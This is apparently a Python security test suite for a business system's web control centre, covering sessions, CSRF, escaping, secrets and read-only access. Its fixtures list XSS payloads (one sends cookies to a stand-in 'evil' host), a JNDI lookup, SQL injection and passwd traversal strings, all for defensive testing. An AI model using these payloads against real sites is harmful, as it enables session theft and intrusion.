"""§57–§60, §92–§93: attack the control centre, and prove it is not a bypass.

Every attack here goes straight at :class:`ControlCentre`, not through a browser.
That is deliberate: hiding a button is not a control, and an attacker sends the
request directly. If a defence only works because the UI does not offer the
action, it does not work.

The property this file exists to establish is narrow and stated plainly: a
compromised control centre can **read business data** and **queue requests**, and
can do nothing else. It cannot send, charge, promote, rewrite, clear HALT, edit
the audit log, or read a secret.
"""

from __future__ import annotations

import pathlib
import sqlite3
import tempfile
import unittest

from solvent import skillslab as lab
from solvent.harness import OWNER, Solvent, run_csv_job
from solvent.web import auth as web_auth
from solvent.web import intents as web_intents
from solvent.web import server as web_server
from solvent.web.app import SECURITY_HEADERS, ControlCentre, Request
from solvent.web.readmodel import ReadModel
from tests_solvent import fixtures_csv as fx
from tests_solvent.test_controlled_trial import AGREED, CLIENT_FILE, workspace
from tests_solvent.test_csv_promotion import promoted
from tests_solvent.test_owner_decisions import decided

PASSWORD = "TEST-ONLY-control-centre-password"

#: Payloads that carry HTML-special characters. Escaping must change these, so
#: none may appear verbatim on a page.
MARKUP_PAYLOADS = (
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "</textarea><script>fetch('//evil/'+document.cookie)</script>",
    "'; DROP TABLE jobs; --",
    "' OR '1'='1",
)

#: Payloads that are plain text. Escaping leaves these byte-identical, and that
#: is right: they are the client's words, they are inert as text, and refusing to
#: show them would hide what the client actually said. They are here because
#: "nothing hostile appears verbatim" is the wrong property, and an earlier
#: version of this file asserted it.
TEXT_PAYLOADS = (
    "../../etc/passwd",
    "${jndi:ldap://evil/x}",
    "javascript:alert(1)",
)

HOSTILE_STRINGS = MARKUP_PAYLOADS + TEXT_PAYLOADS


def build_database(path: str) -> str:
    solvent = promoted(decided(Solvent(path)))
    solvent.policy.record_contracting_structure(
        owner_identity=OWNER, structure=solvent.policy.INDIVIDUAL,
        reason="test", legal_name="TEST-ONLY Owner",
        email="test-only@example.invalid")
    source, work = workspace(CLIENT_FILE)
    report = run_csv_job(source=source, requirements=list(AGREED), workdir=work,
                         solvent=solvent, client_id="client:one",
                         title="Tidy the export")
    solvent.ledger.open_payment(job_id=report.job_id, amount_cents=12000,
                                rail="stripe")
    for hostile in HOSTILE_STRINGS:
        solvent.relations.handle(job_id=report.job_id, body=hostile, source=source)
    other, other_work = workspace(fx.CLEAN)
    second = run_csv_job(source=other, requirements=list(fx.SIMPLE),
                         workdir=other_work, solvent=solvent,
                         client_id="client:two", title="Second client work")
    # Two lessons, at the two grades that are allowed to teach anything. The
    # learning page's tests are about provenance, and a fixture with nothing
    # learned would let every one of them pass while showing an empty table —
    # which is how a page of assertions ends up proving nothing at all.
    from solvent.types import VerificationTier as _Tier

    solvent.memory.learn(
        kind="checklist_pattern", subject="csv-cleanup",
        payload={"observed": "duplicate rows are the commonest defect"},
        evidence_ref=report.job_id, tier=_Tier.T1_DETERMINISTIC)
    solvent.memory.learn(
        kind="job_economics", subject="client:one",
        payload={"quoted_cents": 12000, "settled": True},
        evidence_ref=report.job_id, tier=_Tier.T3_EXTERNAL_FACT)

    project = solvent.skillslab.record_need(
        skill="pdf-extract", need="a client sent a PDF", observed_on=report.job_id)
    solvent.skillslab.check_overlap(
        project_id=project, target_covers=frozenset({"extract_pdf_text"}))
    solvent.store.close()
    return report.job_id, second.job_id, project


class Base(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.dir = pathlib.Path(tempfile.mkdtemp())
        cls.db = str(cls.dir / "solvent.db")
        cls.job_id, cls.other_job_id, cls.project_id = build_database(cls.db)
        cls.hash = web_auth.hash_password(PASSWORD)

    def setUp(self):
        self.spool = pathlib.Path(tempfile.mkdtemp())
        self.centre = web_server.build(self.db, password_hash=self.hash,
                                       spool=str(self.spool))

    def tearDown(self):
        self.centre.read.close()

    def sign_in(self, source: str = "10.0.0.1", centre=None) -> dict:
        """A session on ``centre``. Sessions live in memory per process, so a
        cookie from one ControlCentre means nothing to another — which caught two
        tests of mine that were asserting against an empty redirect body."""
        target = centre or self.centre
        response = target.handle(Request(
            "POST", "/login", form={"password": PASSWORD}, source=source))
        self.assertEqual(response.status, 303)
        return {"solvent_session": response.set_session}

    def get(self, path: str, cookies=None, **query):
        return self.centre.handle(Request("GET", path, query=query,
                                          cookies=cookies or {}))

    def csrf(self, cookies: dict) -> str:
        return self.centre.sessions.get(cookies["solvent_session"])["csrf"]


class NothingWorksWithoutASession(Base):
    """§58. Authorisation is enforced in the handler, before routing."""

    def test_every_page_redirects_an_anonymous_visitor(self):
        for path in ("/", "/jobs", "/job", "/clients", "/client", "/files",
                     "/sources", "/skills", "/skill", "/capabilities",
                     "/learning", "/service", "/approvals", "/money", "/model",
                     "/security", "/audit", "/health", "/setup"):
            with self.subTest(path=path):
                response = self.get(path)
                self.assertEqual(response.status, 303)
                self.assertIn(("Location", "/login"), response.headers)

    def test_a_signed_in_owner_can_reach_them(self):
        """Guards the test above: a surface that refuses everybody is not
        secure, it is broken."""
        cookies = self.sign_in()
        for path in ("/", "/jobs", "/clients", "/sources", "/skills",
                     "/capabilities", "/service", "/approvals", "/money",
                     "/model", "/security", "/audit", "/health", "/setup"):
            with self.subTest(path=path):
                self.assertEqual(self.get(path, cookies).status, 200)

    def test_a_forged_session_cookie_is_not_a_session(self):
        for forged in ("", "x", "a" * 43, "../../admin", "null"):
            with self.subTest(forged=forged):
                response = self.get("/", {"solvent_session": forged})
                self.assertEqual(response.status, 303)

    def test_an_expired_session_stops_working(self):
        clock = [1000.0]
        sessions = web_auth.Sessions(now=lambda: clock[0])
        centre = ControlCentre(ReadModel(self.db), sessions=sessions,
                               password_hash=self.hash,
                               intent_writer=web_intents.IntentWriter(
                                   str(self.spool)))
        session_id, _ = sessions.create()
        cookies = {"solvent_session": session_id}
        self.assertEqual(centre.handle(Request("GET", "/", cookies=cookies)).status,
                         200)
        clock[0] += web_auth.IDLE_TIMEOUT + 1
        self.assertEqual(centre.handle(Request("GET", "/", cookies=cookies)).status,
                         303)
        centre.read.close()

    def test_a_session_expires_absolutely_even_when_used(self):
        clock = [1000.0]
        sessions = web_auth.Sessions(now=lambda: clock[0])
        centre = ControlCentre(ReadModel(self.db), sessions=sessions,
                               password_hash=self.hash,
                               intent_writer=web_intents.IntentWriter(
                                   str(self.spool)))
        session_id, _ = sessions.create()
        cookies = {"solvent_session": session_id}
        for _ in range(30):
            clock[0] += web_auth.IDLE_TIMEOUT - 10
            centre.handle(Request("GET", "/", cookies=cookies))
        self.assertEqual(centre.handle(Request("GET", "/", cookies=cookies)).status,
                         303)
        centre.read.close()

    def test_signing_out_ends_the_session_immediately(self):
        cookies = self.sign_in()
        response = self.centre.handle(Request(
            "POST", "/logout", form={"csrf": self.csrf(cookies)},
            cookies=cookies))
        self.assertEqual(response.status, 303)
        self.assertTrue(response.clear_session)
        self.assertEqual(self.get("/", cookies).status, 303)

    def test_a_logout_by_get_does_nothing(self):
        """A logout on an <img> tag is CSRF too — the annoying kind."""
        cookies = self.sign_in()
        self.centre.handle(Request("GET", "/logout", cookies=cookies))
        self.assertEqual(self.get("/", cookies).status, 200)


class ThePasswordPathResists(Base):
    def test_a_wrong_password_is_refused(self):
        response = self.centre.handle(Request(
            "POST", "/login", form={"password": "wrong"}, source="10.0.0.9"))
        self.assertEqual(response.status, 401)
        self.assertFalse(response.set_session)

    def test_repeated_failures_lock_the_source_out(self):
        for _ in range(web_auth.MAX_FAILURES):
            self.centre.handle(Request("POST", "/login",
                                       form={"password": "wrong"},
                                       source="10.0.0.13"))
        response = self.centre.handle(Request(
            "POST", "/login", form={"password": PASSWORD}, source="10.0.0.13"))
        self.assertEqual(response.status, 429)
        self.assertFalse(response.set_session)

    def test_the_lockout_is_per_source_not_global(self):
        """Otherwise anybody could lock the owner out of their own business."""
        for _ in range(web_auth.MAX_FAILURES):
            self.centre.handle(Request("POST", "/login",
                                       form={"password": "wrong"},
                                       source="10.0.0.66"))
        response = self.centre.handle(Request(
            "POST", "/login", form={"password": PASSWORD}, source="10.0.0.67"))
        self.assertEqual(response.status, 303)

    def test_the_failure_message_does_not_say_which_part_was_wrong(self):
        response = self.centre.handle(Request(
            "POST", "/login", form={"password": "wrong"}, source="10.0.0.21"))
        body = response.body.decode().lower()
        for oracle in ("no such user", "unknown user", "password incorrect",
                       "locked"):
            with self.subTest(oracle=oracle):
                self.assertNotIn(oracle, body)

    def test_no_password_configured_refuses_rather_than_admitting_everyone(self):
        centre = ControlCentre(ReadModel(self.db), password_hash="",
                               intent_writer=web_intents.IntentWriter(
                                   str(self.spool)))
        response = centre.handle(Request("POST", "/login",
                                         form={"password": ""}, source="1.1.1.1"))
        self.assertEqual(response.status, 503)
        self.assertFalse(response.set_session)
        centre.read.close()

    def test_a_short_password_cannot_be_hashed_at_all(self):
        with self.assertRaises(ValueError):
            web_auth.hash_password("short")

    def test_a_stored_hash_does_not_contain_the_password(self):
        encoded = web_auth.hash_password(PASSWORD)
        self.assertNotIn(PASSWORD, encoded)
        self.assertTrue(encoded.startswith("pbkdf2$"))
        self.assertTrue(web_auth.check_password(PASSWORD, encoded))
        self.assertFalse(web_auth.check_password(PASSWORD + "x", encoded))

    def test_a_malformed_hash_never_authenticates(self):
        for broken in ("", "x", "pbkdf2$abc$de$ff", "pbkdf2$1$zz$zz",
                       "plain$1$a$b", None):
            with self.subTest(broken=broken):
                self.assertFalse(web_auth.check_password(PASSWORD, broken))


class CsrfHolds(Base):
    """§58. A form the owner did not submit must not act."""

    #: A verb that needs nothing except a valid token, so a refusal can only
    #: have come from the CSRF check. Using `halt` here was a real weakness in
    #: an earlier version of these tests: it *also* requires the password again,
    #: so the assertions passed on a 403 from the wrong control and a mutant
    #: that disabled CSRF entirely survived the suite.
    CSRF_ONLY_VERB = "acknowledge_alert"

    def test_a_post_without_a_token_is_refused_by_the_csrf_check(self):
        cookies = self.sign_in()
        response = self.centre.handle(Request(
            "POST", "/intent", form={"verb": self.CSRF_ONLY_VERB, "why": "x"},
            cookies=cookies))
        self.assertEqual(response.status, 403)
        self.assertIn("did not carry this session&#x27;s token",
                      response.body.decode())
        self.assertEqual(self.centre.intents.pending(), [])

    def test_a_post_with_another_sessions_token_is_refused_by_the_csrf_check(self):
        first = self.sign_in("10.0.0.2")
        second = self.sign_in("10.0.0.3")
        response = self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": self.CSRF_ONLY_VERB, "why": "x",
                  "csrf": self.csrf(second)},
            cookies=first))
        self.assertEqual(response.status, 403)
        self.assertIn("did not carry this session&#x27;s token",
                      response.body.decode())
        self.assertEqual(self.centre.intents.pending(), [])

    def test_a_missing_token_and_a_missing_password_are_told_apart(self):
        """Two controls, two reasons. A test that only reads the status code
        cannot tell which one fired, and that is how the CSRF check came to be
        untested while looking tested."""
        cookies = self.sign_in()
        no_token = self.centre.handle(Request(
            "POST", "/intent", form={"verb": "halt", "why": "x"},
            cookies=cookies)).body.decode()
        no_password = self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "halt", "why": "x", "csrf": self.csrf(cookies)},
            cookies=cookies)).body.decode()
        self.assertIn("did not carry this session", no_token)
        self.assertIn("needs the owner&#x27;s password again", no_password)
        self.assertNotIn("password again", no_token)

    def test_a_valid_token_is_accepted(self):
        """Guards the two tests above."""
        cookies = self.sign_in()
        response = self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "acknowledge_alert", "why": "seen",
                  "csrf": self.csrf(cookies)}, cookies=cookies))
        self.assertEqual(response.status, 200)
        self.assertEqual(len(self.centre.intents.pending()), 1)

    def test_tokens_differ_between_sessions(self):
        self.assertNotEqual(self.csrf(self.sign_in("10.0.0.4")),
                            self.csrf(self.sign_in("10.0.0.5")))


class ClientDataDoesNotCross(Base):
    """§11 and §66. One client's page shows one client's work."""

    def test_a_client_page_shows_only_that_client(self):
        cookies = self.sign_in()
        body = self.get("/client", cookies, id="client:one").body.decode()
        self.assertIn("client:one", body)
        self.assertNotIn("client:two", body)
        self.assertNotIn("Second client work", body)

    def test_the_other_client_page_is_the_mirror_image(self):
        cookies = self.sign_in()
        body = self.get("/client", cookies, id="client:two").body.decode()
        self.assertIn("Second client work", body)
        self.assertNotIn("Tidy the export", body)

    def test_a_job_id_from_another_client_is_not_relabelled(self):
        """IDOR: asking for a job by id is allowed — the owner owns them all —
        but it must show that job's real client, not the one in the URL."""
        cookies = self.sign_in()
        body = self.get("/job", cookies, id=self.other_job_id).body.decode()
        self.assertIn("client:two", body)

    def test_an_unknown_client_is_refused_rather_than_shown_empty(self):
        cookies = self.sign_in()
        body = self.get("/client", cookies, id="client:does-not-exist").body.decode()
        self.assertIn("No such client", body)

    def test_an_unknown_job_is_refused(self):
        cookies = self.sign_in()
        self.assertIn("No such job",
                      self.get("/job", cookies, id="job_nope").body.decode())


class HostileContentIsDisplayedNotExecuted(Base):
    """§59. Every one of these is in the database, put there by a client."""

    def test_no_hostile_string_appears_verbatim_on_any_page(self):
        """The precise property. Substring checks like "onerror=" absent are
        wrong: `&lt;img src=x onerror=alert(1)&gt;` contains that text and is
        inert, because the angle brackets are escaped. What matters is that the
        client's bytes never reach the page unescaped."""
        cookies = self.sign_in()
        for path in ("/", "/jobs", "/service", "/clients", "/skills", "/audit"):
            body = self.get(path, cookies).body.decode()
            for hostile in MARKUP_PAYLOADS:
                with self.subTest(path=path, hostile=hostile[:30]):
                    self.assertNotIn(hostile, body)

    def test_no_page_opens_a_tag_that_data_put_there(self):
        """No `<` from client data survives. Checked outside the stylesheet,
        which legitimately contains `<`-free CSS that tripped a cruder version
        of this test on `:root:not(...)`."""
        import re

        cookies = self.sign_in()
        for path in ("/", "/jobs", "/service", "/clients", "/skills", "/audit"):
            body = re.sub(r"<style>.*?</style>", "",
                          self.get(path, cookies).body.decode(), flags=re.S)
            with self.subTest(path=path):
                for opener in ("<script", "<iframe", "<svg", "<img",
                               "<textarea", "<object", "<embed"):
                    self.assertNotIn(opener, body.lower())

    def test_a_plain_text_payload_is_shown_as_the_clients_own_words(self):
        """`../../etc/passwd` in a message is text. Escaping does not change it,
        it cannot do anything as text, and hiding it would hide the client."""
        cookies = self.sign_in()
        body = self.get("/service", cookies).body.decode()
        for payload in TEXT_PAYLOADS:
            with self.subTest(payload=payload):
                self.assertIn(payload, body)

    def test_no_attribute_value_is_built_from_client_data(self):
        """`javascript:alert(1)` is safe as table text and unsafe as an href. No
        route puts client data into an attribute, so this pins that."""
        import re

        cookies = self.sign_in()
        for path in ("/", "/jobs", "/service", "/clients"):
            body = self.get(path, cookies).body.decode()
            with self.subTest(path=path):
                for value in re.findall(r'(?:href|src)="([^"]*)"', body):
                    self.assertFalse(value.lower().startswith("javascript:"),
                                     f"{path}: {value[:60]}")
                    self.assertFalse(value.lower().startswith("data:"))

    def test_the_hostile_strings_are_present_but_escaped(self):
        """Guards the tests above: refusing to display the message would hide a
        client's actual words from the owner, which is its own failure."""
        cookies = self.sign_in()
        body = self.get("/service", cookies).body.decode()
        self.assertIn("&lt;script&gt;", body)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", body)

    def test_a_sql_payload_in_a_query_parameter_changes_nothing(self):
        cookies = self.sign_in()
        for payload in ("' OR '1'='1", "'; DROP TABLE jobs; --", "1; DELETE FROM jobs"):
            with self.subTest(payload=payload):
                self.get("/job", cookies, id=payload)
                self.get("/jobs", cookies, state=payload)
                self.get("/client", cookies, id=payload)
        # The tables are still there and still populated.
        self.assertTrue(self.centre.read.jobs())

    def test_a_path_traversal_in_a_parameter_reaches_nothing(self):
        """The canary is real passwd content, not the word "root" — the
        stylesheet contains `:root:not(...)`, which a cruder canary matched."""
        cookies = self.sign_in()
        for payload in ("../../etc/passwd", "/etc/passwd",
                        "....//....//etc/shadow", "..%2f..%2fetc%2fpasswd"):
            with self.subTest(payload=payload):
                body = self.get("/job", cookies, id=payload).body.decode()
                self.assertNotIn("root:x:0:0", body)
                self.assertNotIn("/bin/bash", body)
                self.assertIn("No such job", body)

    def test_no_route_opens_a_file_named_by_the_request(self):
        """There is no file-serving route at all, which is why traversal has
        nothing to reach. Asserted against the source so adding one is a
        deliberate act that fails this test first."""
        import pathlib as _pathlib

        root = _pathlib.Path(web_auth.__file__).parent
        for module in sorted(root.glob("*.py")):
            text = module.read_text()
            with self.subTest(module=module.name):
                self.assertNotIn("send_file", text)
                self.assertNotIn("open(request", text)
                self.assertNotIn("read_bytes()", text.replace(
                    "path.read_text(encoding=\"utf-8\")", ""))

    def test_an_unknown_path_is_a_page_not_a_stack_trace(self):
        cookies = self.sign_in()
        response = self.get("/../../etc/passwd", cookies)
        self.assertIn(response.status, (200, 303, 404))
        self.assertNotIn("Traceback", response.body.decode())

    def test_every_response_carries_the_security_headers(self):
        cookies = self.sign_in()
        headers = dict(self.get("/", cookies).headers)
        self.assertEqual(headers["X-Frame-Options"], "DENY")
        self.assertEqual(headers["X-Content-Type-Options"], "nosniff")
        self.assertIn("default-src 'none'", headers["Content-Security-Policy"])
        self.assertIn("no-store", headers["Cache-Control"])

    def test_the_content_policy_forbids_script_entirely(self):
        """Which is what makes stored XSS unexploitable rather than unlikely."""
        cookies = self.sign_in()
        policy = dict(self.get("/", cookies).headers)["Content-Security-Policy"]
        self.assertNotIn("script-src", policy.replace("default-src 'none'", ""))
        self.assertIn("frame-ancestors 'none'", policy)


class TheSurfaceCannotBecomeABypass(Base):
    """§57. The property the whole design exists for."""

    def test_the_database_connection_is_read_only(self):
        with self.assertRaises(sqlite3.OperationalError):
            self.centre.read._conn.execute(
                "UPDATE jobs SET state = 'COMPLETE'")

    def test_it_cannot_insert_a_capability_promotion(self):
        with self.assertRaises(sqlite3.OperationalError):
            self.centre.read._conn.execute(
                "INSERT INTO registered_capabilities(id,ts,name,covers,proven,"
                "version,owner_identity,why) VALUES('x','t','anything','*',1,"
                "'v','web','because')")

    def test_it_cannot_write_the_audit_log(self):
        with self.assertRaises(sqlite3.OperationalError):
            self.centre.read._conn.execute(
                "INSERT INTO audit_log(seq,ts,event,authority,initiator) "
                "VALUES(9999,'t','forged','owner','web')")

    def test_it_cannot_delete_audit_history(self):
        with self.assertRaises(sqlite3.OperationalError):
            self.centre.read._conn.execute("DELETE FROM audit_log")

    def test_it_cannot_amend_policy(self):
        with self.assertRaises(sqlite3.OperationalError):
            self.centre.read._conn.execute(
                "UPDATE policy_current SET value = '{}' WHERE key = 'document'")

    def test_it_cannot_move_money(self):
        with self.assertRaises(sqlite3.OperationalError):
            self.centre.read._conn.execute(
                "UPDATE payments SET state='PAID', collected_cents=999999")

    def test_the_package_holds_no_action_gate_and_no_owner_key(self):
        """Not "does not use" — has no code path to. Checked against the parsed
        source rather than the text, because a docstring that explains the owner
        key is exactly what this package should contain, and a line that reads
        one is what it must not."""
        import ast
        import pathlib as _pathlib

        forbidden_names = {"ActionGate", "OwnerChannel", "PolicyStore", "Ledger",
                           "SOLVENT_OWNER_KEY", "Solvent"}
        root = _pathlib.Path(web_auth.__file__).parent
        for module in sorted(root.glob("*.py")):
            tree = ast.parse(module.read_text())
            names, strings = set(), set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Name):
                    names.add(node.id)
                elif isinstance(node, ast.Attribute):
                    names.add(node.attr)
                elif isinstance(node, ast.alias):
                    names.add(node.name.split(".")[-1])
                    names.add((node.asname or "").split(".")[-1])
                elif isinstance(node, ast.Constant) and isinstance(node.value, str):
                    strings.add(node.value)
            with self.subTest(module=module.name):
                self.assertEqual(names & forbidden_names, set())
                # And the key's name never appears as a value being looked up.
                for text in strings:
                    self.assertNotEqual(text, "SOLVENT_OWNER_KEY")

    def test_the_package_never_imports_the_composition_root(self):
        import ast
        import pathlib as _pathlib

        root = _pathlib.Path(web_auth.__file__).parent
        for module in sorted(root.glob("*.py")):
            tree = ast.parse(module.read_text())
            imported = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.ImportFrom) and node.module:
                    imported.add(node.module)
                elif isinstance(node, ast.Import):
                    imported.update(a.name for a in node.names)
            with self.subTest(module=module.name):
                for forbidden in ("harness", "solvent.harness", "gate",
                                  "solvent.gate", "owner", "solvent.owner",
                                  "policy", "solvent.policy"):
                    self.assertNotIn(forbidden, imported)

    def test_the_surface_never_constructs_a_solvent(self):
        """Constructing one would install the egress hook and deny bind, so this
        is load-bearing as well as a security property."""
        import pathlib as _pathlib

        root = _pathlib.Path(web_auth.__file__).parent
        for module in sorted(root.glob("*.py")):
            with self.subTest(module=module.name):
                self.assertNotIn("Solvent(", module.read_text())

    def test_a_consequential_intent_is_marked_as_needing_an_approval(self):
        cookies = self.sign_in()
        response = self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "promote_capability", "subject": "anything",
                  "why": "attacker asks nicely", "csrf": self.csrf(cookies)},
            cookies=cookies))
        self.assertEqual(response.status, 200)
        queued = self.centre.intents.pending()
        self.assertEqual(len(queued), 1)
        self.assertTrue(queued[0]["requires_owner_approval"])
        self.assertEqual(queued[0]["intent_class"], web_intents.CONSEQUENTIAL)

    def test_queueing_an_intent_promotes_nothing(self):
        cookies = self.sign_in()
        self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "promote_capability", "subject": "pdf-extract",
                  "why": "x", "csrf": self.csrf(cookies)}, cookies=cookies))
        names = {c["name"] for c in self.centre.read.capabilities()
                 if c.get("proven")}
        self.assertNotIn("pdf-extract", names)

    def test_an_intent_verb_that_is_not_on_the_list_is_refused(self):
        cookies = self.sign_in()
        for verb in ("", "rm", "exec", "clear_audit", "disable_firewall",
                     "dump_secrets", "promote_everything"):
            with self.subTest(verb=verb):
                response = self.centre.handle(Request(
                    "POST", "/intent",
                    form={"verb": verb, "why": "x", "csrf": self.csrf(cookies)},
                    cookies=cookies))
                self.assertEqual(response.status, 400)
        self.assertEqual(self.centre.intents.pending(), [])

    def test_a_post_to_any_other_path_does_nothing(self):
        cookies = self.sign_in()
        for path in ("/", "/jobs", "/admin", "/api/promote", "/policy"):
            with self.subTest(path=path):
                response = self.centre.handle(Request(
                    "POST", path, form={"csrf": self.csrf(cookies),
                                        "verb": "halt", "why": "x"},
                    cookies=cookies))
                self.assertEqual(response.status, 404)
        self.assertEqual(self.centre.intents.pending(), [])


class HaltAndResumeAreNotSymmetrical(Base):
    """§53. Stopping is safe; starting is not. They must not cost the same."""

    def test_halting_needs_the_password_again(self):
        cookies = self.sign_in()
        response = self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "halt", "why": "something looks wrong",
                  "csrf": self.csrf(cookies)}, cookies=cookies))
        self.assertEqual(response.status, 403)
        self.assertIn("password again", response.body.decode())

    def test_halting_with_the_password_is_queued_as_safe(self):
        cookies = self.sign_in()
        response = self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "halt", "why": "something looks wrong",
                  "password": PASSWORD, "csrf": self.csrf(cookies)},
            cookies=cookies))
        self.assertEqual(response.status, 200)
        queued = self.centre.intents.pending()
        self.assertEqual(queued[0]["intent_class"], web_intents.SAFE)
        self.assertFalse(queued[0]["requires_owner_approval"])

    def test_resuming_is_consequential_and_needs_an_owner_approval(self):
        cookies = self.sign_in()
        response = self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "resume", "why": "looks fine now",
                  "password": PASSWORD, "csrf": self.csrf(cookies)},
            cookies=cookies))
        self.assertEqual(response.status, 200)
        self.assertTrue(self.centre.intents.pending()[0]
                        ["requires_owner_approval"])

    def test_enabling_real_execution_is_consequential(self):
        self.assertEqual(web_intents.classify("enable_real_execution"),
                         web_intents.CONSEQUENTIAL)

    def test_the_intent_did_not_change_the_posture_by_itself(self):
        cookies = self.sign_in()
        self.centre.handle(Request(
            "POST", "/intent",
            form={"verb": "halt", "why": "w", "password": PASSWORD,
                  "csrf": self.csrf(cookies)}, cookies=cookies))
        self.assertFalse(self.centre.read.posture()["halted"])
        self.assertTrue(self.centre.read.posture()["simulation_only"])


class NoSecretReachesAPage(Base):
    """§91. Nothing here should have a secret to leak, which is the point."""

    def test_no_page_contains_a_credential_shaped_value(self):
        import re

        cookies = self.sign_in()
        pattern = re.compile(r"(sk_live_|sk_test_[A-Za-z0-9]{8}|whsec_[A-Za-z0-9]{8}"
                             r"|pbkdf2\$)")
        for path in ("/", "/jobs", "/security", "/setup", "/model", "/money",
                     "/audit", "/health", "/approvals"):
            with self.subTest(path=path):
                self.assertIsNone(pattern.search(self.get(path, cookies)
                                                 .body.decode()))

    def test_the_password_hash_is_never_rendered(self):
        cookies = self.sign_in()
        for path in ("/setup", "/security", "/"):
            with self.subTest(path=path):
                self.assertNotIn(self.hash,
                                 self.get(path, cookies).body.decode())

    def test_the_setup_page_reports_presence_not_values(self):
        cookies = self.sign_in()
        body = self.get("/setup", cookies).body.decode()
        self.assertIn("Owner setup", body)
        self.assertNotIn("TEST-ONLY Owner", body)

    def test_a_session_id_is_not_echoed_into_a_page(self):
        cookies = self.sign_in()
        body = self.get("/", cookies).body.decode()
        self.assertNotIn(cookies["solvent_session"], body)

    def test_the_csrf_token_is_not_the_session_id(self):
        cookies = self.sign_in()
        self.assertNotEqual(self.csrf(cookies), cookies["solvent_session"])

    def test_the_login_page_leaks_nothing_before_authentication(self):
        body = self.centre.handle(Request("GET", "/login")).body.decode()
        for leak in ("client:one", "Tidy the export", "solvent.db", self.hash):
            with self.subTest(leak=str(leak)[:20]):
                self.assertNotIn(str(leak), body)


class SimulatedMoneyIsNeverRealMoney(Base):
    """§40. The most consequential lie this surface could tell."""

    def test_collected_excludes_simulated_payments(self):
        cash = self.centre.read.money()
        self.assertEqual(cash["collected_cents"], 0)

    def test_a_simulated_payment_is_reported_separately(self):
        solvent = Solvent(self.db)
        from solvent.ledger import SIMULATED_PREFIX
        from solvent.types import PaymentState

        payment = solvent.ledger.open_payment(job_id="job_sim",
                                              amount_cents=50000,
                                              rail="fixture_rail")
        solvent.ledger.set_payment_state(
            payment, PaymentState.PAID, collected_cents=50000,
            verification_method=f"{SIMULATED_PREFIX}fixture")
        solvent.store.close()
        centre = web_server.build(self.db, password_hash=self.hash,
                                  spool=str(self.spool))
        try:
            cash = centre.read.money()
            self.assertEqual(cash["simulated_cents"], 50000)
            self.assertEqual(cash["collected_cents"], 0)
            cookies = self.sign_in(centre=centre)
            body = centre.handle(Request("GET", "/money",
                                         cookies=cookies)).body.decode()
            self.assertIn("SIMULATED", body)
        finally:
            centre.read.close()


class TheSurfaceDegradesHonestly(Base):
    """§64. A control centre that lies when the backend is missing is worse than
    one that will not start."""

    def test_a_missing_database_refuses_rather_than_inventing_one(self):
        with self.assertRaises(sqlite3.OperationalError):
            ReadModel(str(self.dir / "does-not-exist.db"))

    def test_an_empty_database_shows_empty_states_not_invented_figures(self):
        empty = str(self.dir / "empty.db")
        Solvent(empty).store.close()
        centre = web_server.build(empty, password_hash=self.hash,
                                  spool=str(self.spool))
        try:
            cookies = self.sign_in(centre=centre)
            body = centre.handle(Request("GET", "/", cookies=cookies)).body.decode()
            self.assertIn("No jobs yet", body)
            self.assertIn("$0.00", body)
            self.assertNotIn("NO DATA YET FAKE", body)
        finally:
            centre.read.close()

    def test_a_missing_table_is_an_empty_section_not_an_error(self):
        rows = self.centre.read.rows("SELECT * FROM a_table_that_never_existed")
        self.assertEqual(rows, [])


class TheRuntimeSideOfTheBoundary(unittest.TestCase):
    """The half that can change something. The web process wrote a file; nothing
    about that file is trusted here."""

    def setUp(self):
        self.dir = pathlib.Path(tempfile.mkdtemp())
        self.db = str(self.dir / "solvent.db")
        self.solvent = promoted(decided(Solvent(self.db)))
        self.spool = pathlib.Path(tempfile.mkdtemp())
        self.writer = web_intents.IntentWriter(str(self.spool))

    def tearDown(self):
        self.solvent.store.close()

    def consume(self, **kwargs):
        from solvent.harness import consume_owner_intents

        return consume_owner_intents(self.solvent, spool=str(self.spool),
                                     **kwargs)

    def test_a_safe_intent_is_executed(self):
        from solvent.types import OperatingMode

        self.writer.write(verb="halt", requested_by="web:owner",
                          why="something looks wrong")
        results = self.consume()
        self.assertEqual(results[0]["outcome"], "HALT engaged")
        self.assertIs(self.solvent.policy.operating_mode, OperatingMode.HALT)

    def test_no_consequential_intent_is_carried_out_without_an_approval(self):
        """The property is that nothing happens, whatever the outcome is
        called. A verb that needs an approval is either left waiting for one
        or refused outright; neither of those is the action taking place."""
        from solvent.harness import QUEUED, consume_owner_intents

        for verb, (intent_class, _) in web_intents.INTENTS.items():
            if intent_class != web_intents.CONSEQUENTIAL:
                continue
            with self.subTest(verb=verb):
                writer = web_intents.IntentWriter(
                    str(pathlib.Path(tempfile.mkdtemp())))
                writer.write(verb=verb, requested_by="web:owner",
                             why="an attacker asks nicely", subject="anything")
                results = consume_owner_intents(self.solvent,
                                                spool=str(writer.spool))
                self.assertIn(results[0]["outcome"], (QUEUED, "REFUSED"))
                if results[0]["outcome"] == "REFUSED":
                    self.assertIn(verb, results[0]["why"])

    def test_an_intent_left_waiting_is_announced_once(self):
        """The web process cannot write to the audit log, so an attempted
        consequential action would otherwise leave no trace until somebody
        acted on it. It is announced the first time the runtime sees it, and
        not again on every sweep."""
        from solvent.harness import consume_owner_intents

        writer = web_intents.IntentWriter(str(pathlib.Path(tempfile.mkdtemp())))
        record = writer.write(verb="resume", requested_by="web:owner",
                              why="an attacker asks nicely", subject="")
        for _ in range(3):
            consume_owner_intents(self.solvent, spool=str(writer.spool))
        announced = [e for e in self.solvent.audit.events()
                     if e["event"] == "owner.intent_queued"]
        self.assertEqual(len(announced), 1)
        self.assertEqual(announced[0]["decision"], "resume")
        self.assertEqual(announced[0]["input_ref"], record["id"])

    def test_a_promotion_intent_promotes_nothing(self):
        self.writer.write(verb="promote_capability", requested_by="web:owner",
                          why="x", subject="pdf-extract")
        self.consume()
